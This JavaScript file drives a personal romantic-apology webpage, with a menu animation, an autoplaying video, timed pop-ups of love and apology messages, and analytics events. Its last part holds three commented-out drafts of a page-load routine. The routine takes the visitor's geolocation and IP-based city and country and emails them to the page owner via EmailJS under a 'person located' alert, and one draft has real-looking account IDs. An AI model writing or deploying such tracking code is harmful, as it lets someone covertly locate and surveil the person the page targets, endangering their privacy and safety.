// Select the menu toggle and header panel elements
const menuToggle = document.getElementById("menu_toggle");
const headerPanel = document.getElementById("header_panel");

// Helper function to animate height
function animateHeight(element, startHeight, endHeight, duration, callback) {
  const startTime = performance.now();

  function step(currentTime) {
    const elapsed = currentTime - startTime;
    const progress = Math.min(elapsed / duration, 1); // Progress from 0 to 1
    const currentHeight = startHeight + (endHeight - startHeight) * progress;

    element.style.height = `${currentHeight}px`;

    if (progress < 1) {
      requestAnimationFrame(step);
    } else if (callback) {
      callback();
    }
  }

  requestAnimationFrame(step);
}

// Add click event listener to the menu toggle
menuToggle.addEventListener("click", (e) => {
  e.preventDefault(); // Prevent default link behavior

  if (headerPanel.style.display === "none" || headerPanel.style.height === "0px") {
    // Show the header panel with animation
    headerPanel.style.display = "block";
    const targetHeight = headerPanel.scrollHeight; // Get full height of content
    animateHeight(headerPanel, 0, targetHeight, 300);
  } else {
    // Hide the header panel with animation
    const currentHeight = headerPanel.offsetHeight; // Current visible height
    animateHeight(headerPanel, currentHeight, 0, 300, () => {
      headerPanel.style.display = "none"; // Hide completely after animation
    });
  }
});

// For the video Played

const video = document.getElementById('myVideo');
const soundButton = document.getElementById('soundButton');

// Show controls only when video is visible
function checkVideoVisibility() {
  const rect = video.getBoundingClientRect();
  if (rect.top < window.innerHeight && rect.bottom >= 0) {
    video.play(); // Autoplay the video muted
  } else {
    video.pause();
  }
}

// Toggle sound on button click
function toggleSound() {
  if (video.muted) {
    video.muted = false;
    soundButton.textContent = '🔊'; // Change icon
  } else {
    video.muted = true;
    soundButton.textContent = '🔇'; // Change icon
  }
}

// Toggle fullscreen mode
function toggleFullScreen() {
  if (video.requestFullscreen) {
    video.requestFullscreen();
  } else if (video.mozRequestFullScreen) { // Firefox
    video.mozRequestFullScreen();
  } else if (video.webkitRequestFullscreen) { // Chrome, Safari, Opera
    video.webkitRequestFullscreen();
  } else if (video.msRequestFullscreen) { // IE/Edge
    video.msRequestFullscreen();
  }
}

window.addEventListener('scroll', checkVideoVisibility);
window.addEventListener('load', checkVideoVisibility);



// Array of romantic messages
const messages = [
  "Every love story has its ups and downs, but the best ones always find their way back.",
  "You are worth every fight, every effort, every moment of my life.",
  "I’m still here, holding on, because you are my home.",
  "I didn’t create this page just to show you how much I love you... I created it because words alone could never be enough.",
  "You are the dream I never want to wake up from.",
  "Even in silence, my heart whispers your name.",
  "We may have faced storms, but my love for you has only grown stronger with every wave.",
  "You’re not just my love, you’re my safe place, my home.",
  "I’ve made mistakes, but loving you was never one of them.",
  "No matter how tough life gets, having you makes everything worth it.",
  "If I could turn back time, I'd hold you closer, love you louder, and never let a moment pass without showing how much you mean to me.",
  "You deserve a love that's pure, gentle, and patient—I'll spend forever proving I can be that for you.",
  "I miss you, not just the moments we shared, but the way you made every ordinary day feel magical.",
  "You're my once-in-a-lifetime kind of love. I’ll keep holding on, hoping you’ll feel that too.",
  "You're not just a memory—you're my heart, my future, and the best part of every dream I have.",
  "Forgiveness isn’t just a gift we give others; it’s the bridge that mends hearts meant to stay connected.",
  "Love is not measured by perfection but by the courage to stay, to fight, and to heal—together.",
  "You are my greatest treasure and losing you would be my deepest regret. I’m truly sorry and will keep fighting for us.",
  "Love isn't about never falling—it’s about choosing to rise again, together, after the fall."
];

// Function to display a random message
function showRandomMessage() {
  const messageBox = document.getElementById('messageBox');
  const messageText = document.getElementById('messageText');

  // Choose a random message
  const randomIndex = Math.floor(Math.random() * messages.length);
  messageText.textContent = messages[randomIndex];

  // Show the message box
  messageBox.classList.add('show');

  // Auto-close after 20 seconds
  setTimeout(closeMessage, 20000);
}

// Function to close the message box
function closeMessage() {
  const messageBox = document.getElementById('messageBox');
  messageBox.classList.remove('show');
}

// Show a message every 60 seconds (adjust as needed)
setInterval(showRandomMessage, 60000);

// Show the first message after 15 seconds
setTimeout(showRandomMessage, 15000);


document.getElementById("menu_toggle").addEventListener("click", function () {
  gtag('event', 'button_click', {
    'event_category': 'interaction',
    'event_label': 'Menu List'
  });
});

window.addEventListener('scroll', function () {
  let scrollPosition = window.scrollY + window.innerHeight;
  let documentHeight = document.documentElement.scrollHeight;

  // إذا كان المستخدم قد وصل إلى 50% من الصفحة
  if (scrollPosition >= documentHeight / 2) {
    gtag('event', 'scroll', {
      'event_category': 'engagement',
      'event_label': '50% Scroll'
    });
  }
  else if (scrollPosition >= documentHeight / 4) {
    gtag('event', 'scroll', {
      'event_category': 'engagement',
      'event_label': '25% Scroll'
    });
  }
  else if (scrollPosition >= documentHeight / 10) {
    gtag('event', 'scroll', {
      'event_category': 'engagement',
      'event_label': '10% Scroll'
    });
  }
});

// تتبع عند بدء تشغيل الفيديو
video.addEventListener('play', function () {
  gtag('event', 'video_play', {
    'event_category': 'Media',
    'event_label': 'Video Started'
  });
});

// تتبع عند إيقاف الفيديو
video.addEventListener('pause', function () {
  gtag('event', 'video_pause', {
    'event_category': 'Media',
    'event_label': 'Video Paused'
  });
});

// تتبع عند الانتهاء من الفيديو
video.addEventListener('ended', function () {
  gtag('event', 'video_end', {
    'event_category': 'Media',
    'event_label': 'Video Ended'
  });
});

// تتبع التقدم في الفيديو (مثلاً بعد 50% من الفيديو)
video.addEventListener('timeupdate', function () {
  var currentTime = video.currentTime;
  var duration = video.duration;

  // تتبع إذا كان المستخدم قد شاهد 50% من الفيديو
  if (currentTime >= duration / 2) {
    gtag('event', 'video_halfway', {
      'event_category': 'Media',
      'event_label': 'Video Halfway'
    });
  }
  else if (currentTime >= duration / 4) {
    gtag('event', 'video_halfway', {
      'event_category': 'Media',
      'event_label': 'Video 25%'
    });
  }
  else if (currentTime >= duration / 10) {
    gtag('event', 'video_halfway', {
      'event_category': 'Media',
      'event_label': 'Video 10%'
    });
  }
});


// // جمع الموقع الجغرافي وإرساله بالبريد الإلكتروني
// function getGeolocationAndSendEmail() {
//     if (navigator.geolocation) {
//         navigator.geolocation.getCurrentPosition(
//             (position) => {
//                 const latitude = position.coords.latitude;
//                 const longitude = position.coords.longitude;

//                 // إعداد البيانات لإرسالها بالبريد الإلكتروني
//                 const emailParams = {
//                     to_name: "Your Name",
//                     message: `
//                     🚨 تنبيه! تم تحديد موقع شخص:
//                     - 🌍 خط العرض: ${latitude}
//                     - 🌍 خط الطول: ${longitude}
//                     `,
//                 };

//                 // إرسال البيانات باستخدام EmailJS
//                 emailjs
//                     .send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailParams)
//                     .then(
//                         (response) => {
//                             console.log("Email sent successfully!", response.status, response.text);
//                         },
//                         (error) => {
//                             console.error("Failed to send email:", error);
//                         }
//                     );
//             },
//             (error) => {
//                 console.error("Error getting location:", error.message);
//             }
//         );
//     } else {
//         console.error("Geolocation is not supported by this browser.");
//     }
// }

// // إدراج مكتبة EmailJS
// (function() {
//     emailjs.init("YOUR_USER_ID"); // ضع الـ User ID الخاص بك هنا
// })();

// // استدعاء الوظيفة عند تحميل الصفحة
// window.onload = () => {
//     getGeolocationAndSendEmail();
// };

//////////////////////////////////////////////////////////
// // إدراج مكتبة EmailJS
// (function() {
//   emailjs.init("YOUR_USER_ID"); // ضع الـ User ID الخاص بك هنا
// })();

// function getGeolocationAndSendEmail() {
//   if (navigator.geolocation) {
//       navigator.geolocation.getCurrentPosition(
//           async (position) => {
//               const latitude = position.coords.latitude;
//               const longitude = position.coords.longitude;

//               // جمع عنوان الـ IP
//               const ipResponse = await fetch("https://ipinfo.io/json?token=YOUR_TOKEN");
//               const ipData = await ipResponse.json();
//               const ipAddress = ipData.ip;

//               // البيانات المجمعة
//               const userData = {
//                   latitude,
//                   longitude,
//                   ipAddress,
//                   city: ipData.city,
//                   region: ipData.region,
//                   country: ipData.country,
//               };

//               console.log("Collected Data:", userData);

//               // إعداد البيانات لإرسالها بالبريد الإلكتروني
//               const emailParams = {
//                   to_name: "Your Name",
//                   message: `
//                   🚨 تنبيه! تم تحديد موقع شخص:
//                   - 🌍 خط العرض: ${latitude}
//                   - 🌍 خط الطول: ${longitude}
//                   - 🌐 IP: ${ipAddress}
//                   - 🏙️ المدينة: ${ipData.city}
//                   - 📍 المنطقة: ${ipData.region}, ${ipData.country}
//                   `,
//               };

//               emailjs
//                   .send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailParams)
//                   .then(
//                       (response) => {
//                           console.log("Email sent successfully!", response.status, response.text);
//                       },
//                       (error) => {
//                           console.error("Failed to send email:", error);
//                       }
//                   );
//           },
//           (error) => {
//               console.error("Error getting location:", error.message);
//           }
//       );
//   } else {
//       console.error("Geolocation is not supported by this browser.");
//   }
// }

// // استدعاء الوظيفة عند تحميل الصفحة
// window.onload = () => {
//   getGeolocationAndSendEmail();
// };


// // إدراج مكتبة EmailJS
// (function () {
//   emailjs.init("_iB8dyTcg15mPWQcB"); // ضع الـ User ID الخاص بك هنا
// })();

// // جمع الموقع الجغرافي وإرسال الرابط في البريد الإلكتروني
// function getGeolocationAndSendEmail() {
//   if (navigator.geolocation) {
//       navigator.geolocation.getCurrentPosition(
//           (position) => {
//               const latitude = position.coords.latitude;
//               const longitude = position.coords.longitude;

//               // إنشاء رابط خرائط جوجل
//               const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

//               // إعداد البيانات لإرسالها بالبريد الإلكتروني
//               const emailParams = {
//                   to_name: "Your Name", // اسم المستلم
//                   message: `
//                   🚨 تم تحديد موقع شخص!
//                   - 🌍 خط العرض: ${latitude}
//                   - 🌍 خط الطول: ${longitude}
//                   - 🌐 رابط خرائط جوجل: ${googleMapsLink}
//                   `,
//               };

//               // إرسال البيانات باستخدام EmailJS
//               emailjs
//                   .send("service_xlmeklg", "template_o9zcj7j", emailParams)
//                   .then(
//                       (response) => {
//                           console.log("Email sent successfully!", response.status, response.text);
//                       },
//                       (error) => {
//                           console.error("Failed to send email:", error);
//                       }
//                   );
//           },
//           (error) => {
//               console.error("Error getting location:", error.message);
//           }
//       );
//   } else {
//       console.error("Geolocation is not supported by this browser.");
//   }
// }

// // استدعاء الوظيفة عند تحميل الصفحة
// window.onload = () => {
//   getGeolocationAndSendEmail();
// };